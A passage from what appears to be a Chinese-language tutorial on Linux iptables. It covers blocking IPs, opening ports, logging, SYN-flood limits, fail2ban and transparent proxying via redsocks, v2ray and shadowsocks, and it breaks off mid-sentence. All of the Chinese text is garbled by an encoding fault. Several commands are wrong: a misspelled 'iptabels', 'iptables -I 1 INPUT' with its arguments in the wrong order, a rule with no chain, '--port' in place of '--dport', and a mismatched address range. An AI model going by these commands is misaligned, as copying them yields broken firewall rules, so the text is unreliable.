é‡å®šå‘ç­‰ï¼›filterï¼Œç”¨äºè¿‡æ»¤æ•°æ®åŒ…ï¼Œæ¯”å¦‚ ACCEPTï¼ˆå…è®¸ï¼‰ï¼ŒDROPï¼ˆä¸¢å¼ƒï¼‰ã€REJECTï¼ˆæ‹’ç»ï¼‰ã€LOGï¼ˆè®°å½•æ—¥å¿—ï¼‰ï¼›raw è¡¨é™¤äº† -j NOTRACK å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå¸¸ç”¨çš„åŠ¨ä½œï¼Œé‚£å°±æ˜¯ -j TRACEï¼Œç”¨äºè·Ÿè¸ªæ•°æ®åŒ…ï¼Œè¿›è¡Œè§„åˆ™çš„è°ƒè¯•ï¼Œä½¿ç”¨ dmesg æŸ¥çœ‹ã€‚ ä¸€èˆ¬æ¥è®²tableæ˜¯kernelçš„äº‹æƒ…ï¼Œå¤–éƒ¨æ— éœ€å…³å¿ƒã€‚ä¸€èˆ¬éƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„chain,ç„¶ååœ¨inputæˆ–è€…outputè¿™ç§ç°æœ‰çš„chainåé¢appendä¸Šå»ï¼Œæ¯”å¦‚è¿™æ ·ï¼š iptables -N Servicesiptables -A INPUT -j Servicesiptables -A Services -m tcp -p tcp â€“dport 80 -j ACCEPT æ„æ€å°±æ˜¯è¯´ï¼Œé»˜è®¤çš„input chainèµ°å®Œäº†å‘ç°è¿˜æ²¡æœ‰åŒ¹é…ä¸Šï¼Œå°±å…¨éƒ¨ä¸¢ç»™æ–°åˆ›å»ºçš„chainã€‚ #~ iptables -L INPUT -n -v --line-numbers Chain INPUT (policy DROP) num target prot opt source destination 1 DROP all -- 202.54.1.1 0.0.0.0/0 2 DROP all -- 202.54.1.2 0.0.0.0/0 3 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state NEW,ESTABLISHED æ‰§è¡Œé¡ºåº(è¿™ä¸ªæ¯”è¾ƒéº»çƒ¦): iptablesæ‰§è¡Œè§„åˆ™æ—¶ï¼Œæ˜¯ä»ä»è§„åˆ™è¡¨ä¸­ä»ä¸Šè‡³ä¸‹é¡ºåºæ‰§è¡Œçš„ï¼Œå¦‚æœæ²¡é‡åˆ°åŒ¹é…çš„è§„åˆ™ï¼Œå°±ä¸€æ¡ä¸€æ¡å¾€ä¸‹æ‰§è¡Œï¼Œå¦‚æœé‡åˆ°åŒ¹é…çš„è§„åˆ™åï¼Œé‚£ä¹ˆå°±æ‰§è¡Œæœ¬è§„åˆ™ï¼Œæ‰§è¡Œåæ ¹æ®æœ¬è§„åˆ™çš„åŠ¨ä½œ(accept, reject, logç­‰)ï¼Œå†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œçš„æƒ…å†µã€‚æ¯”å¦‚è¯´ä¸Šé¢è¿™ä¸ªï¼Œæ‹‰é»‘äº†202.54.1.2è™½ç„¶ç¬¬ä¸‰æ¡è§„åˆ™è¯´å…¨éƒ¨æ¥å—ï¼Œå…¶å®202.54.1.2çš„åŒ…æ˜¯è¿›ä¸æ¥çš„ã€‚è¿™ä¹Ÿæ˜¯å¾ˆå¤šæ•™ç¨‹å»ºè®®æŠŠè‡ªå·±çš„iptableså†™åœ¨åé¢çš„åŸå› ï¼Œä¸è¦æŠŠç³»ç»Ÿç°æœ‰è§„åˆ™è¦†ç›–æ‰ã€‚ iptables -L -n -v //æŸ¥çœ‹å·²æ·»åŠ çš„iptablesè§„åˆ™ é»˜è®¤æ˜¯å…¨éƒ¨æ¥å—çš„ Chain INPUT (policy ACCEPT) ## å…è®¸è¿›å…¥è¿™å°ç”µè„‘ target prot opt source destination Chain FORWARD (policy ACCEPT) ## è·¯ç”±ç›¸å…³ target prot opt source destination Chain OUTPUT (policy ACCEPT) ## å…è®¸å‘å‡ºè¿™å°ç”µè„‘ target prot opt source destination å…è®¸æ‰€æœ‰è¿æ¥iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT iptablesåé¢å¯ä»¥è·Ÿçš„å‚æ•°å¾ˆå¤š # iptables -t mangle -X # iptables -P INPUT ACCEPT # iptables -P OUTPUT ACCEPT # iptables -P FORWARD ACCEPT æ¥è§£é‡Šä¸€ä¸‹è¿™äº›å‚æ•°çš„æ„æ€-L List rulesçš„æ„æ€ -v verbose -n numeric ä¸èµ°dnsï¼Œç›´æ¥æ˜¾ç¤ºip,è¿™æ ·ä¼šå¿«ä¸€ç‚¹ -F flushingï¼ˆåˆ é™¤ï¼‰æ‰€æœ‰çš„rules -X delete chain -t table_name(ä¸€èˆ¬å°±natå’Œmangleä¸¤ç§) -P è®¾ç½®policy(æ¯”å¦‚è¯´DROP , REJECT, REDIRECT) --line-numbers //æ˜¾ç¤ºæ¯æ¡è§„åˆ™æ‰€åœ¨çš„è¡Œå· -s source iP --sport 22 //æºç«¯å£å·22 --sport 513:65535 // port rangeä¹Ÿæ˜¯å¯ä»¥çš„ --dport 22 //ç›®æ ‡ç«¯å£å·22 --dport 513:65535 //port range iptables -t nat -A POSTROUTING -j SNAT --to-source 192.168.1.100:2000-3000 //natçš„æ—¶å€™åŠ rangeä¹Ÿæ˜¯å¯ä»¥çš„ -i interfaceï¼Œå°±æ˜¯eth0è¿™äº›ç½‘å¡è®¾å¤‡ä»€ä¹ˆçš„ LOG --log-prefix &quot;IP_SPOOF A: &quot; //åŠ æ—¥å¿—,è¿™ä¸ªLOGå…³é”®è¯å’ŒDROP,ACCEPTéƒ½å·®ä¸å¤šçš„ï¼Œè·Ÿåœ¨-j å±è‚¡åé¢ -m mac --mac-source //-m æˆ‘çŒœæ˜¯metrics ï¼Œå°±æ˜¯è¯´æ ¹æ®å“ªç§è¯„åˆ¤æ ‡å‡†ï¼Œè¿™é‡Œæ˜¯macåœ°å€ -m state --state NEW,ESTABLISHED RELATED -p tcp protocolä¹‹ç±»çš„ï¼Œæ¯”æ–¹è¯´tcp,udp,icmp(ping)ç­‰ç­‰ -m owner --uid-owner youruserid //æ‰€æœ‰ç”±è¿™ä¸ªuidå¯¹åº”çš„è¿›ç¨‹åˆ›å»ºçš„åŒ… --set-mark 0x400 è®¾ç½®mark ï¼Œä»…é™äºmangleè¡¨ -m mark --mark 0x400 åé¢å¯ä»¥ç”¨è¿™ä¸ªmarkæ¥åŒ¹é…è¢«æ‰“äº†æ ‡çš„åŒ… æ‹‰é»‘ä¸€ä¸ªip iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP //è¿™ä¸ªæ‹‰é»‘çš„æ•ˆæœæ˜¯tcp,udp,icmpå…¨éƒ¨ä¸é€šã€‚å¯¹æ–¹çš„curl,pingå…¨éƒ¨å¡ä½ DROPæ˜¯ç›´æ¥ä¸å›è¯äº†ï¼ŒREJECTåˆ™æ˜¯ä¼šç»™å¯¹æ–¹å‘ä¸€ä¸ª ACK/RST ï¼ˆè¿™è·Ÿä¸å›åº”å¯¹æ–¹æ˜¯æœ‰åŒºåˆ«çš„ï¼‰REJECT differs to DROP that it does send a packet back, but the answer is as if a server is located on the IP, but does not have the port in a listening state. IPtables will sent a RST/ACK in case of TCP or with UDP an ICMP destination port unreachable.(å¯¹æ–¹æ”¶åˆ°åï¼Œçœ‹èµ·äº†å°±åƒæ˜¯è¿™å°httpæœåŠ¡å™¨æ²¡æœ‰listenåœ¨80ç«¯å£ä¸Šä¸€æ ·)åœ¨äº’è”ç½‘çš„æœåŠ¡å™¨ä¸Šï¼Œæ‹‰é»‘åˆ«äººä¸€èˆ¬éƒ½æ˜¯ç”¨DROPï¼Œå› ä¸ºæ²¡å¿…è¦å†å»é€šçŸ¥å¯¹æ–¹å·²è¢«æ‹‰é»‘ã€‚ å–æ¶ˆæ‹‰é»‘ï¼šä¹Ÿå°±æ˜¯åˆ é™¤ä¸Šé¢è¿™æ¡è§„åˆ™ iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP æ¯”æ–¹è¯´æˆ‘ä¸å°å¿ƒæŠŠ202.54.1.1æ‹‰é»‘äº†ï¼Œæ€ä¹ˆæŒ½å›ç®€å•æ¥è¯´ iptables -A â€¦ éƒ½å¯ä»¥ç”¨è¿™ä¸€å¥æ’¤é”€æ‰ iptables -D â€¦ iptables -L OUTPUT -n --line-numbers | grep 202.54.1.1 //å‘ç°åœ¨æ¡è§„åˆ™ç¬¬å››è¡Œ iptabels -D INPUT 4 //æŠŠè¿™ä¸ªç¬¬å››è¡Œçš„è§„åˆ™åˆ æ‰ iptables -D INPUT -s 202.54.1.1 -j DROP //è¿™ä¸ªä¹Ÿæ˜¯ä¸€æ ·çš„ åªå…è®¸ç‰¹å®šipè®¿é—®æŸä¸ªç«¯å£ sudo iptables -I INPUT -p tcp ! -s 200.200.200.0/24 â€“destination-port 1080 -j DROP ä¸Šé¢è¯´äº†ï¼Œiptablesçš„é¡ºåºæ˜¯ä»ä¸Šå¾€ä¸‹matchï¼Œå‰é¢çš„å¦‚æœåŒ¹é…ä¸Šäº†ï¼Œåé¢çš„å°±ä¸ä¼šæœ‰æœºä¼šè¢«åŒ¹é…ã€‚æ‰€ä»¥å‡å¦‚ç¬¬2æ¡è§„åˆ™è¯´å…¨éƒ¨æ¥å—ï¼Œæˆ‘æƒ³æ‹‰é»‘æŸä¸ªipï¼Œå°±å¾—ç”¨-Iï¼ŒæŠŠæ‹‰é»‘çš„è§„åˆ™æ’å…¥åˆ°æœ€å‰é¢ï¼ˆ-I 1 å°±æ˜¯æ’å…¥åˆ°ç¬¬ä¸€ä½ï¼‰:iptables -I 1 INPUT -s xxx.xxx.xxx.xxx -j DROP iptables -P FORWARD DROP ## æŠŠforward ä¸€å¾‹æ”¹ä¸ºdropï¼ˆèµ°æœ¬æœºä»£ç†çš„åŒ…å…¨éƒ¨ä¸¢æ‰ï¼‰ iptables -A INPUT -s 192.168.1.3 ## Aæ˜¯append sæ˜¯sourceï¼Œæ‹’ç»æ¥å—192.168.1.3çš„è®¿é—®ï¼Œå°±æ˜¯é»‘åå•äº† iptables -A INPUT -s 192.168.0.0/24 -p tcp --destination-port 25 -j DROP ## block all devices on this network , pæ˜¯protocol,SMTPä¸€èˆ¬æ˜¯25ç«¯å£ iptables -A INPUT -s 192.168.0.66 -j ACCEPT ## ç™½åå• iptables -D INPUT 3 ##è¿™ä¸ª3æ˜¯å½“å‰INPUTé“¾çš„ç¬¬3æ¡è§„åˆ™ï¼Œå°±æ˜¯è¯´åˆ æ‰è¿™ä¸ªchainé‡Œé¢çš„ç¬¬3æ¡è§„åˆ™ iptables -I INPUT -s 192.168.0.66 -j ACCEPT ## ç™½åå•ï¼Œå’Œ-Aä¸åŒï¼ŒAæ˜¯åŠ åˆ°å°¾éƒ¨ï¼ŒIæ˜¯åŠ åˆ°listçš„å¤´éƒ¨ï¼Œé¡ºåºå¾ˆé‡è¦ã€‚ iptables -I INPUT -s 123.45.6.7 -j DROP #å±è”½å•ä¸ªIPçš„å‘½ä»¤ iptables -I INPUT -s 123.0.0.0/8 -j DROP #å°æ•´ä¸ªæ®µå³ä»123.0.0.1åˆ°123.255.255.254çš„å‘½ä»¤ iptables -I INPUT -s 124.45.0.0/16 -j DROP #å°IPæ®µå³ä»123.45.0.1åˆ°123.45.255.254çš„å‘½ä»¤ public interfaceï¼ˆå¯¹å¤–æä¾›æœåŠ¡çš„ç½‘å¡åº”è¯¥æŠŠç§æœ‰çš„ipæ‹‰é»‘æ‰ï¼‰//å‡å¦‚ä½ çš„æŸä¸ªå…¬å…±ç½‘å¡ä¸“é—¨å¯¹å¤–æœåŠ¡ï¼Œipå—…æ¢æ²¡ä»€ä¹ˆçš„ï¼Œä½†æ˜¯ä¸‹é¢è¿™ç§ç§æœ‰ipå·æ®µåº”è¯¥ç¦æ­¢ã€‚non-routable source addressesçš„åŒ…éƒ½å¯ä»¥è¢«DROPæ‰ï¼ˆå°±æ˜¯è¯´æ‹’ç»å±€åŸŸç½‘å†…è®¾å¤‡192.168.x.xå°±ä¸è¦æƒ³ç€è®¿é—®è¿™å°ä¸»æœºçš„eth1ç½‘å¡äº†ï¼‰ å…·ä½“æ¥è¯´ï¼Œè¿™äº›éƒ½æ˜¯ä¿ç•™çš„ç§æœ‰ipåœ°å€ iptables -A INPUT -i eth1 -s 192.168.0.0/24 -j DROP 10.0.0.0/8 -j (A) 172.16.0.0/12 (B) 192.168.0.0/16 (C) 224.0.0.0/4 (MULTICAST D) 240.0.0.0/5 (E) 127.0.0.0/8 (LOOPBACK) // See Wikipedia and RFC5735 for full list of reserved networks. #å…è®¸æ‰€æœ‰æœ¬æœºå‘å¤–çš„è®¿é—® iptables -A OUTPUT -j ACCEPT # å…è®¸è®¿é—®22ç«¯å£ iptables -A INPUT -p tcp --dport 22 -j ACCEPT #å…è®¸è®¿é—®80ç«¯å£ iptables -A INPUT -p tcp --dport 80 -j ACCEPT #å…è®¸è®¿é—®443ç«¯å£ iptables -A INPUT -p tcp --dport 443 -j ACCEPT #å…è®¸FTPæœåŠ¡çš„21å’Œ20ç«¯å£ iptables -A INPUT -p tcp --dport 21 -j ACCEPT iptables -A INPUT -p tcp --dport 20 -j ACCEPT #å¦‚æœæœ‰å…¶ä»–ç«¯å£çš„è¯ï¼Œè§„åˆ™ä¹Ÿç±»ä¼¼ï¼Œç¨å¾®ä¿®æ”¹ä¸Šè¿°è¯­å¥å°±è¡Œ #å…è®¸ping iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT #ç¦æ­¢å…¶ä»–æœªå…è®¸çš„è§„åˆ™è®¿é—® iptables -A INPUT -j REJECT #ï¼ˆæ³¨æ„ï¼šå¦‚æœ22ç«¯å£æœªåŠ å…¥å…è®¸è§„åˆ™ï¼ŒSSHé“¾æ¥ä¼šç›´æ¥æ–­å¼€ã€‚ï¼‰ iptables -A FORWARD -j REJECT CIDRï¼ˆæ¯”å¦‚è¯´å°æ‰facebook.comï¼‰# host -t a www.facebook.com www.facebook.com has address 69.171.228.40 # whois 69.171.228.40 | grep CIDR CIDR: 69.171.224.0/19 //å°±æ˜¯è¯´facebookçš„ç½‘ç«¯åœ¨69.171.224.0/19è¿™ä¸ªèŒƒå›´é‡Œ # iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j DROP // è¿™å°ä¸»æœºæ²¡æ³•ä¸Šfacebookäº† # ping www.facebook.com ping: sendmsg: Operation not permitted(å°±æ˜¯è¢«å‘å‡ºå»çš„åŒ…è¢«iptablesæ‹¦ä¸‹æ¥äº†) //ä¸Šé¢è¿™å †çœ‹èµ·æ¥æŒºéº»çƒ¦çš„ iptables -A OUTPUT -p tcp -d www.facebook.com -j DROP //ç›´æ¥æå®š,ä½†æ˜¯ä¸æ¨èè¿™ä¹ˆå¹² æ ¹æ®æŸä¸ªmacåœ°å€æŒ‡å®š# iptables -I INPUT -m mac --mac-source 3E:D7:88:A6:66:8E -j ACCEPT # iptables -I INPUT -p tcp --dport 22 -m mac --mac-source 3E:D7:88:A6:66:8E -j ACCEPT # iptables -I INPUT -p tcp --dport 22 -m mac --mac-source 3E:D7:88:A6:66:8E -j REJECT # iptables -I INPUT -p tcp --port 22 -m mac ! --mac-source 3E:D7:88:A6:66:8E -j REJECT //é™¤äº†ç‰¹å®šmacä»¥å¤–éƒ½ä¸å…è®¸è®¿é—® # iptables -A INPUT -m mac --mac-source 00:0F:EA:91:04:08 -j DROP ä¸å…è®¸åˆ«äººpingæˆ‘# iptables -A INPUT -p icmp --icmp-type echo-request -j DROP # iptables -A INPUT -i eth1 -p icmp --icmp-type echo-request -j DROP iptables -A INPUT -s 192.168.1.0/24 -p icmp --icmp-type echo-request -j ACCEPT ### ** assumed that default INPUT policy set to DROP ** ############# iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPT iptables -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT ## ** all our server to respond to pings ** ## iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT æ‰“logå…ˆç…§ä¸Šé¢çš„åšæ³•æŠŠfacebookç»™å°äº†ï¼ˆæ‰€æœ‰å‘åˆ°facebookçš„åŒ…å…¨éƒ¨dropï¼Œåªæ˜¯æˆ‘ä»¬è¿™ä¸€æ¬¡æƒ³è¦çœ‹æ—¥å¿—ï¼‰ iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j LOG --log-prefix &quot;IP_SPOOF A: &quot; iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j DROP æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ç”¨iptablesçš„æ—¥å¿—è®°å½•ã€‚ $ iptables -A INPUT -j LOG æˆ‘ä»¬è¿˜å¯ä»¥å®šä¹‰å“ªäº›æ—¥å¿—å°†è¢«åˆ›å»ºçš„æºIPæˆ–èŒƒå›´ã€‚ $ iptables -A INPUT -s 192.168.10.0/24 -j LOG å®šä¹‰æˆ‘ä»¬çš„iptables -log ç”Ÿæˆçš„æ—¥å¿—çº§åˆ«ã€‚ $ iptables -A INPUT -s 192.168.10.0/24 -j LOG --log-level 4 æˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ ä¸€äº›å‰ç¼€ç”Ÿæˆçš„æ—¥å¿—ï¼Œæ‰€ä»¥å®ƒä¼šå¾ˆå®¹æ˜“åœ¨ä¸€ä¸ªå·¨å¤§çš„æ–‡ä»¶ä¸­æœç´¢æ—¥å¿—ã€‚ $ iptables -A INPUT -s 192.168.10.0/24 -j LOG --log-prefix &#39;** SUSPECT **&#39; åœ¨Ubuntuå’ŒDebianiptablesçš„æ—¥å¿—ç”±å†…æ ¸ç”Ÿæˆçš„ã€‚å› æ­¤ï¼Œæ£€æŸ¥ä»¥ä¸‹å†…æ ¸æ—¥å¿—æ–‡ä»¶ã€‚æŸ¥çœ‹iptablesçš„æ—¥å¿—ubuntuä¸Šé»˜è®¤æ—¥å¿—æ˜¯è¿›å…¥äº†/var/log/sys.logæ–‡ä»¶ä¸­$ tail /var/log/sys.log åªå¼€7000-7010ç«¯å£,åªå…è®¸æŸä¸ªç½‘æ®µçš„ipå‘è¯·æ±‚ä»¥åŠå…¶ä»–iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 7000:7010 -j ACCEPT ## only accept connection to tcp port 80 (Apache) if ip is between 192.168.1.100 and 192.168.1.200 ## iptables -A INPUT -p tcp --destination-port 80 -m iprange --src-range 192.168.1.100-192.168.1.200 -j ACCEPT ## nat example ## iptables -t nat -A POSTROUTING -j SNAT --to-source 192.168.1.20-192.168.1.25 Replace ACCEPT with DROP to block port: ## open port ssh tcp port 22 ## iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 22 -j ACCEPT ## open cups (printing service) udp/tcp port 631 for LAN users ## iptables -A INPUT -s 192.168.1.0/24 -p udp -m udp --dport 631 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -p tcp -m tcp --dport 631 -j ACCEPT ## allow time sync via NTP for lan users (open udp port 123) ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p udp --dport 123 -j ACCEPT ## open tcp port 25 (smtp) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 25 -j ACCEPT # open dns server ports for all ## iptables -A INPUT -m state --state NEW -p udp --dport 53 -j ACCEPT iptables -A INPUT -m state --state NEW -p tcp --dport 53 -j ACCEPT ## open http/https (Apache) server port to all ## iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT ## open tcp port 110 (pop3) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 110 -j ACCEPT ## open tcp port 143 (imap) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 143 -j ACCEPT ## open access to Samba file server for lan users only ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 137 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 138 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 139 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 445 -j ACCEPT ## open access to proxy server for lan users only ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 3128 -j ACCEPT ## open access to mysql server for lan users only ## iptables -I INPUT -p tcp --dport 3306 -j ACCEPT é™åˆ¶æœ€å¤§è¿æ¥æ•°To allow 3 ssh connections per client host, enter:(ä¸€ä¸ªclientæœ€å¤šèƒ½å¤Ÿè¿3ä¸ªsshè¿æ¥è¿‡æ¥) # iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT httpç«¯å£ä¸€ä¸ªclientæœ€å¤š20ä¸ªè¿æ¥ # iptables -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 24 -j DROP ä½¿ç”¨iptablesé˜»æ­¢syn-floodä¸€èˆ¬åœ¨è·¯ç”±å™¨é‡Œé¢éƒ½æœ‰è¿™ä¹ˆä¸€æ¡ iptables -N syn-flood iptables -A syn-flood -m limit --limit 50/s --limit-burst 10 -j RETURN iptables -A syn-flood -j DROP iptables -I INPUT -j syn-flood -N åˆ›å»ºä¸€ä¸ªæ¡æ–°çš„é“¾ --limit 50/s è¡¨ç¤ºæ¯ç§’50æ¬¡;1/m åˆ™ä¸ºæ¯åˆ†é’Ÿä¸€æ¬¡ --limit-burst è¡¨ç¤ºå…è®¸è§¦å‘ limit é™åˆ¶çš„æœ€å¤§åŒ…ä¸ªæ•° (é¢„è®¾5)ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œæœ€å¤šè£…10ä¸ªï¼Œè¶…è¿‡10ä¸ªå°±è£…ä¸ä¸‹äº†ï¼Œè¿™äº›åŒ…å°±ç»™åé¢çš„è§„åˆ™äº† -I INPUT -j syn-flood æŠŠINPUTçš„åŒ…äº¤ç»™syn-floodé“¾å¤„ç† è¿™é‡Œçš„--limit-burst=10ç›¸å½“äºè¯´æœ€å¼€å§‹æœ‰10ä¸ªå¯ä»¥åŒ¹é…çš„åŒ…å»è½¬å‘ï¼Œç„¶ååŒ¹é…çš„åŒ…çš„ä¸ªæ•°æ˜¯æ ¹æ®--limit=50/sè¿›è¡Œé™åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯æ¯ç§’é™åˆ¶è½¬å‘50ä¸ªæ•°æ®åŒ…ï¼Œå¤šä½™çš„ä¼šè¢«ä¸‹é¢ç¬¦åˆè¦æ±‚çš„DROPè§„åˆ™å»å¤„ç†ï¼Œè¿›è¡Œä¸¢å¼ƒï¼Œè¿™æ ·å°±å®ç°äº†å¯¹æ•°æ®åŒ…çš„é™é€Ÿé—®é¢˜ã€‚ ç°åœ¨æ¥çœ‹çœ‹fail2banæ˜¯æ€ä¹ˆæ‹‰é»‘ä¸€ä¸ªipçš„ä¸€èˆ¬æ¥è¯´è¦æ‹’ç»ä¸€ä¸ªipè®¿é—®http,httpså¯ä»¥è¿™ä¹ˆå¹² iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 80 -j DROP iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 443 -j DROP è€Œäº‹å®ä¸Šå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªaction ~ cat /etc/fail2ban/action.d/iptables.conf # Option: actionban # Notes.: command executed when banning an IP. Take care that the # command is executed with Fail2Ban user rights. # Tags: See jail.conf(5) man page # Values: CMD # actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt; REDIRECT (é€æ˜ä»£ç†)é¦–å…ˆæ¥çœ‹ä¸€ä¸ªæŠŠæ‰€æœ‰èµ°ç½‘å¡eth0çš„æ•°æ®åŒ…éƒ½è½¬å‘åˆ°redSocksçš„è§„åˆ™ // æ–°å»ºè·¯ç”±è½¬å‘è¡¨ä¸­çš„ä¸€ä¸ªé“¾ REDSOCKS sudo iptables -t nat -N REDSOCKS // è®¾ç½®ä¸éœ€è¦ä»£ç†è½¬å‘çš„ç½‘æ®µ // ç›®çš„ä¸ºå¢™å¤–ä»£ç†æœåŠ¡å™¨çš„æ•°æ®åŒ…ä¸€å®šä¸èƒ½è½¬å‘ sudo iptables -t nat -A REDSOCKS -d $SS_SERVER_IP -j RETURN // ç›®çš„ä¸ºå±€åŸŸç½‘å’Œæœ¬åœ°å›ç¯åœ°å€çš„æ•°æ®åŒ…ä¸ç”¨è½¬å‘ sudo iptables -t nat -A REDSOCKS -d 172.0.0.0/24 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN // å°†æ•°æ®åŒ…è½¬å‘åˆ° redsocks sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 // å°† REDSOCKS é“¾çš„è§„åˆ™åº”ç”¨åˆ°ç»è¿‡ eth0 ç½‘å¡çš„æ•°æ®åŒ… sudo iptables -t nat -A OUTPUT -p tcp -o eth0 -j REDSOCKS redirectä¸åªå±€é™äºè½¬å‘åˆ°æœ¬åœ°ç‰¹å®šç«¯å£ï¼Œè¿˜æ”¯æŒè½¬åˆ°å±€åŸŸç½‘å†…å¦ä¸€å°è®¾å¤‡ä¸Š ç»å¸¸ä¼šçœ‹åˆ°æ•™ç¨‹å¦‚ä½•æŠŠä¸€å°å±€åŸŸç½‘linux nasæˆ–è€…è™šæ‹Ÿæœºå˜æˆè½¯è·¯ç”±çš„æ•™ç¨‹ï¼Œé¦–å…ˆéœ€è¦è®¾å¤‡å¼€å¯ipè½¬å‘ cat /proc/sys/net/ipv4/ip_forward 1 // è¿™ä¸ªå€¼é»˜è®¤æ˜¯0 æ¯”æ–¹è¯´æŠŠæ‰€æœ‰incoming æµé‡(ç›®æ ‡ç«¯å£æ˜¯80çš„)å¯¼å‘8080ç«¯å£ iptables -t nat -I PREROUTING --src 0/0 --dst 192.168.1.5 -p tcp --dport 80 -j REDIRECT --to-ports 8080 ç„¶åæ ¹æ®v2rayçš„é…ç½®æ–‡ä»¶è®¾ç½®é€æ˜ä»£ç†ã€‚å†æ¥ä¸‹æ¥æŠŠæ‰€æœ‰natè¡¨ä¸Šçš„æµé‡äº¤ç»™v2rayç›‘å¬çš„ç«¯å£ openwrtåœ¨/etc/firewall.userä¸­æ·»åŠ å¦‚ä¸‹è„šæœ¬ï¼Œå®ç°æœ¬åœ°é€æ˜ä»£ç†ï¼ˆå…¶å®å¹¶ä¸å®Œç¾ï¼‰ ```sh iptables -t nat -N V2RAY //åœ¨natè¿™ä¸ªè¡¨é‡Œé¢åˆ›å»ºä¸€ä¸ªV2RAYçš„chain iptables -t nat -A V2RAY -d x.x.x.x -j RETURN ##xxxæ˜¯vpsçš„ipåœ°å€ iptables -t nat -A V2RAY -d 0.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 10.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 127.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 169.254.0.0/16 -j RETURN iptables -t nat -A V2RAY -d 172.16.0.0/12 -j RETURN iptables -t nat -A V2RAY -d 192.168.0.0/16 -j RETURN iptables -t nat -A V2RAY -d 224.0.0.0/4 -j RETURN iptables -t nat -A V2RAY -d 240.0.0.0/4 -j RETURN iptables -t nat -A V2RAY -p tcp -j REDIRECT --to-ports 1060 iptables -t nat -A PREROUTING -p tcp -j V2RAY //ä¸‹é¢æ˜¯æŠŠæ‰€æœ‰çš„udpåŒ…å¯¼åˆ°1080ç«¯å£ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆå†™æˆ‘ä¸çŸ¥é“ ip rule add fwmark 1 table 100 ip route add local 0.0.0.0/0 dev lo table 100 iptables -t mangle -N V2RAY_MASK iptables -t mangle -A V2RAY_MASK -d 192.168.0.0/16 -j RETURN iptables -t mangle -A V2RAY_MASK -p udp -j TPROXY --on-port 1080 --tproxy-mark 1 iptables -t mangle -A PREROUTING -p udp -j V2RAY_MASK äº²æµ‹ï¼Œé€æ˜ä»£ç†çš„æ•ˆæœæ˜¯å¯ä»¥çš„ã€‚åªæ˜¯æ¯”ä¸ä¸Šåœ¨windowsä¸Šçš„é€Ÿåº¦,cpuå ç”¨è¾¾åˆ°50%ä»¥ä¸Šï¼Œæ²¡ä»€ä¹ˆæ„æ€ã€‚ ç›¸æ¯”èµ·æ¥,shadowsocks-libevç»™å‡ºäº†è¿™æ ·ä¸€ä»½transparent proxyçš„ä»£ç ï¼Œæ›´åŠ æ¸…æ¥š # Create new chain iptables -t nat -N SHADOWSOCKS iptables -t mangle -N SHADOWSOCKS # Ignore your shadowsocks server&#39;s addresses # It&#39;s very IMPORTANT, just be careful. iptables -t nat -A SHADOWSOCKS -d 123.123.123.123 -j RETURN # Ignore LANs and any other addresses you&#39;d like to bypass the proxy # See Wikipedia and RFC5735 for full list of reserved networks. # See ashi009/bestroutetb for a highly optimized CHN route list. iptables -t nat -A SHADOWSOCKS -d 0.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 10.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 127.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 169.254.0.0/16 -j RETURN iptables -t nat -A SHADOWSOCKS -d 172.16.0.0/12 -j RETURN iptables -t nat -A SHADOWSOCKS -d 192.168.0.0/16 -j RETURN iptables -t nat -A SHADOWSOCKS -d 224.0.0.0/4 -j RETURN iptables -t nat -A SHADOWSOCKS -d 240.0.0.0/4 -j RETURN # Anything else should be redirected to 